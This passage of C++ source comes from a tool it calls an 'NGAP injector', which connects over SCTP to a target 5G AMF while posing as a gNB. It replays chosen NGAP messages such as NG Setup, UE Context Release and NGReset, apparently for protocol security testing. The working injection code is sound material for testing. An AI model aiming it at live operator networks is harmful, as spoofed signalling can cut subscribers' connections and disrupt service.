  if (static_cast<size_t>(bytes_sent) != pdu.length()) {
    throw std::runtime_error(std::string("Partial ") + pdu_name + " send");
  }

  std::printf("NGAP injector: sent %s bytes=%d/%zu\n", pdu_name, bytes_sent, static_cast<size_t>(pdu.length()));
}

static std::string expected_ngap_type_from_label(const std::string& expected)
{
  auto value = expected;
  const auto paren_pos = value.find('(');
  if (paren_pos != std::string::npos) {
    value.resize(paren_pos);
  }
  const auto space_pos = value.find(' ');
  if (space_pos != std::string::npos) {
    value.resize(space_pos);
  }
  return trim_copy(value);
}

static bool wait_for_amf_message(sctp_socket& socket, const std::string& expected, int timeout_ms, const probe_config& cfg)
{
  if (expected.empty()) {
    return true;
  }

  const auto start         = std::chrono::steady_clock::now();
  const auto expected_type = expected_ngap_type_from_label(expected);
  std::printf("NGAP injector: waiting for AMF %s before next replay step\n", expected.c_str());

  while (true) {
    int remaining_ms = timeout_ms;
    if (timeout_ms >= 0) {
      const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
      if (elapsed_ms >= timeout_ms) {
        throw std::runtime_error("Timed out waiting for AMF " + expected);
      }
      remaining_ms = timeout_ms - static_cast<int>(elapsed_ms);
    }

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(socket.fd().value(), &read_fds);

    timeval timeout = {};
    timeout.tv_sec  = remaining_ms / 1000;
    timeout.tv_usec = (remaining_ms % 1000) * 1000;

    const int ready = ::select(socket.fd().value() + 1, &read_fds, nullptr, nullptr, timeout_ms < 0 ? nullptr : &timeout);
    if (ready < 0) {
      throw std::runtime_error(std::string("Failed while waiting for AMF message: ") + std::strerror(errno));
    }
    if (ready == 0) {
      throw std::runtime_error("Timed out waiting for AMF " + expected);
    }

    std::array<uint8_t, network_gateway_sctp_mtu> recv_buffer = {};
    sctp_sndrcvinfo                               sndrcv_info = {};
    int                                           msg_flags   = 0;
    const ssize_t bytes_received = ::sctp_recvmsg(socket.fd().value(),
                                                  recv_buffer.data(),
                                                  recv_buffer.size(),
                                                  nullptr,
                                                  nullptr,
                                                  &sndrcv_info,
                                                  &msg_flags);
    if (bytes_received < 0) {
      throw std::runtime_error(std::string("Failed to receive AMF message: ") + std::strerror(errno));
    }
    if (bytes_received == 0) {
      throw std::runtime_error("AMF closed SCTP association while waiting for " + expected);
    }
    if ((msg_flags & MSG_NOTIFICATION) != 0) {
      std::printf("NGAP injector: ignored SCTP notification while waiting for AMF %s\n", expected.c_str());
      continue;
    }

    byte_buffer pdu{byte_buffer::fallback_allocation_tag{},
                    span<const uint8_t>{recv_buffer.data(), static_cast<size_t>(bytes_received)}};
    const std::string decoded = describe_ngap_pdu(pdu);
    if (decoded == "decode-failed") {
      std::printf("NGAP injector: ignored non-decodable AMF DATA while waiting for %s length=%zd\n",
                  expected.c_str(),
                  bytes_received);
      continue;
    }

    std::printf("NGAP injector: received AMF candidate while waiting for %s length=%zd decoded=%s stream=%u ppid=%u\n",
                expected.c_str(),
                bytes_received,
                decoded.c_str(),
                sndrcv_info.sinfo_stream,
                ntohl(sndrcv_info.sinfo_ppid));
    if (cfg.dump_pdu_hex) {
      std::printf("NGAP injector: received AMF hex=");
      dump_hex(pdu);
    }
    if (decoded != expected_type) {
      std::printf("NGAP injector: ignored AMF %s while waiting for %s\n", decoded.c_str(), expected_type.c_str());
      continue;
    }
    if (is_downlink_nas_authentication_reject(pdu)) {
      std::printf("NGAP injector: received NAS Authentication Reject; aborting current replay sequence\n");
      return false;
    }
    std::printf("NGAP injector: matched AMF %s; continuing replay\n", decoded.c_str());
    return true;
  }
}

static probe_config parse_args(int argc, char** argv)
{
  probe_config cfg;
  CLI::App     app{"Send NG Setup Request and interactive UE Context Release Request packets to a target AMF over SCTP"};

  app.add_option("--amf-addr,--target", cfg.amf_addresses, "Target AMF address or hostname")
      ->required()
      ->expected(1, -1);
  app.add_option("--amf-port,--port", cfg.amf_port, "Target AMF SCTP port")->capture_default_str();
  app.add_option("--bind-addr", cfg.bind_addresses, "Local SCTP bind address")->expected(1, -1);
  app.add_option("--bind-port", cfg.bind_port, "Local SCTP source port; 0 lets the kernel choose")
      ->capture_default_str();
  app.add_option("--bind-interface", cfg.bind_interface, "Local interface for SO_BINDTODEVICE")->capture_default_str();
  app.add_option("--sctp-init-max-attempts", cfg.init_max_attempts, "SCTP INIT max attempts")
      ->capture_default_str();
  app.add_option("--sctp-max-init-timeo-ms", cfg.max_init_timeo_ms, "SCTP INIT max timeout in milliseconds")
      ->capture_default_str();
  app.add_flag_function("--no-hex", [&cfg](std::int64_t) { cfg.dump_pdu_hex = false; },
                        "Do not print the packed NGAP PDU hex dump");

  try {
    app.parse(argc, argv);
  } catch (const CLI::ParseError& e) {
    std::exit(app.exit(e));
  }

  if (cfg.bind_port < 0 || cfg.bind_port > 65535) {
    throw std::runtime_error("--bind-port must be in range 0..65535");
  }
  if (cfg.bind_port != 0 && cfg.bind_addresses.empty()) {
    throw std::runtime_error("--bind-port requires --bind-addr");
  }

  return cfg;
}

static int run_probe(const probe_config& cfg)
{
  auto& logger = ocudulog::fetch_basic_logger("SCTP-GW");

  current_gnb_id = static_cast<uint32_t>(read_uint64_or_default("gNB ID", default_gnb_id, max_default_gnb_id));
  current_ran_node_name = read_text_token_or_default("RAN node name", default_ran_node_name);
  std::printf("NGAP injector: using gNB ID=%u gNB ID bit length=%u sector ID=%u RAN node name=%s\n",
              current_gnb_id,
              static_cast<unsigned>(default_gnb_id_bit_len),
              static_cast<unsigned>(default_sector_id),
              current_ran_node_name.c_str());

  std::printf("NGAP injector: target=[%s]:%d bind=[%s]:%d bind_interface=%s ppid=%u stream=%u\n",
              join_strings(cfg.amf_addresses, ", ").c_str(),
              cfg.amf_port,
              cfg.bind_addresses.empty() ? "implicit" : join_strings(cfg.bind_addresses, ", ").c_str(),
              cfg.bind_port,
              cfg.bind_interface.c_str(),
              NGAP_PPID,
              stream_no);

  std::vector<sockaddr_storage> dest_addrs = resolve_sctp_addresses(cfg.amf_addresses, cfg.amf_port, logger);
  if (dest_addrs.empty()) {
    throw std::runtime_error("Failed to resolve any target AMF address");
  }

  std::vector<sockaddr_storage> bind_addrs;
  if (!cfg.bind_addresses.empty()) {
    bind_addrs = resolve_sctp_addresses(cfg.bind_addresses, cfg.bind_port, logger);
    if (bind_addrs.empty()) {
      throw std::runtime_error("Failed to resolve any local bind address");
    }
  }

  const int socket_family = !bind_addrs.empty() ? (has_ipv6_address(bind_addrs) ? AF_INET6 : AF_INET)
                                                : (has_ipv6_address(dest_addrs) ? AF_INET6 : AF_INET);
  keep_compatible_destinations(dest_addrs, socket_family);
  if (dest_addrs.empty()) {
    throw std::runtime_error("No target AMF address is compatible with the selected SCTP socket family");
  }

  sctp_socket_params params = {};
  params.if_name           = "N2-PROBE";
  params.ai_family         = socket_family;
  params.ai_socktype       = SOCK_SEQPACKET;
  params.init_max_attempts = cfg.init_max_attempts;
  params.max_init_timeo    = std::chrono::milliseconds{cfg.max_init_timeo_ms};
  params.nodelay           = true;

  expected<sctp_socket> socket_outcome = sctp_socket::create(params);
  if (!socket_outcome.has_value()) {
    throw std::runtime_error("Failed to create SCTP socket");
  }
  sctp_socket socket = std::move(socket_outcome.value());

  if (!bind_addrs.empty() && !socket.bindx(bind_addrs, cfg.bind_interface)) {
    throw std::runtime_error("Failed to bind SCTP socket");
  }

  sctp_assoc_t assoc_id = 0;
  std::printf("NGAP injector: connecting to %zu resolved AMF address(es)...\n", dest_addrs.size());
  if (!socket.connectx(dest_addrs, assoc_id) || assoc_id == 0) {
    throw std::runtime_error(std::string("Failed to connect SCTP association: ") + std::strerror(errno));
  }

  const auto bound_port     = socket.get_bound_port();
  const auto peer_addresses = get_peer_addresses(socket.fd().value(), assoc_id);
  std::printf("NGAP injector: SCTP connected fd=%d assoc_id=%d local=%s local_port=%s peer=[%s]\n",
              socket.fd().value(),
              static_cast<int>(assoc_id),
              get_local_endpoint(socket.fd().value()).c_str(),
              bound_port.has_value() ? std::to_string(bound_port.value()).c_str() : "unknown",
              peer_addresses.empty() ? "unknown" : join_strings(peer_addresses, ", ").c_str());

  std::printf("NGAP injector: SCTP association remains open; NGSetupRequest is not sent automatically, select menu option 1 to send it\n");
  while (true) {
    const auto injectable_pdus = read_injectable_ngap_pdus();
    if (!injectable_pdus.has_value()) {
      break;
    }

    bool abort_current_sequence = false;
    for (const auto& injectable_pdu : injectable_pdus.value()) {
      if (!wait_for_amf_message(socket, injectable_pdu.wait_for_amf_before_send, injectable_pdu.amf_wait_timeout_ms, cfg)) {
        abort_current_sequence = true;
        break;
      }
      if (injectable_pdu.wait_before_send_ms > 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds{injectable_pdu.wait_before_send_ms});
      }
      if (injectable_pdu.name == nullptr) {
        continue;
      }
      send_ngap_pdu(socket, dest_addrs.front(), injectable_pdu.pdu, injectable_pdu.name, cfg);
    }
    if (abort_current_sequence) {
      std::printf("NGAP injector: replay sequence aborted; returning to menu\n");
    }
  }

  std::printf("NGAP injector: sending NGReset before closing SCTP association\n");
  print_confirmation("NGReset", {{"gNB-ID", default_to_string(current_gnb_id)},
                                 {"RAN-Node-Name", current_ran_node_name},
                                 {"Reset-Type", "NG Interface Reset"},
                                 {"Cause", "radio-connection-with-ue-lost"}});
  send_ngap_pdu(socket, dest_addrs.front(), build_ng_reset(true, {}), "NGReset", cfg);

  const int eof_result =
      ::sctp_sendmsg(socket.fd().value(),
                     nullptr,
                     0,
                     reinterpret_cast<sockaddr*>(&dest_addrs.front()),
                     sockaddr_len(dest_addrs.front()),
                     htonl(NGAP_PPID),
                     SCTP_EOF,
                     stream_no,
                     0,
                     0);
  if (eof_result < 0) {
    std::printf("NGAP injector: warning: failed to send SCTP EOF during close: %s\n", std::strerror(errno));
  } else {
    std::printf("NGAP injector: sent SCTP EOF and closing socket\n");
  }

  socket.close();
  return 0;
}

} // namespace

int main(int argc, char** argv)
{
  ocudulog::init();

  try {
    return run_probe(parse_args(argc, argv));
  } catch (const std::exception& e) {
    std::fprintf(stderr, "ngap_injector error: %s\n", e.what());
    return 1;
  }

  return 0;
}
